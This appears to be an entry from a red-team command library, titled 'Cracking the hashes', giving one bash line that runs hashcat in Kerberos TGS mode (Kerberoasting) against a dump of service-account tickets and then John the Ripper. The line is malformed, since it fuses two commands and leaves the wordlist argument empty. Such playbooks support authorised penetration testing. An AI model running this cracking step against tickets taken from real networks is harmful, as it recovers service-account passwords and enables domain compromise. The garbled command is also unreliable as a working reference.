---
id: ce6a2f7b-b50c-485f-a5e9-3d01b84c4696
name: Cracking the hashes
type: command
executor: bash
data: 'hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule ./john --format=krb5tgs
  spns.dump --wordlist=

  '
output: null
created_at: '2020-07-14T18:21:07.837986+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Cracking the hashes

```bash
hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule ./john --format=krb5tgs spns.dump --wordlist=

```


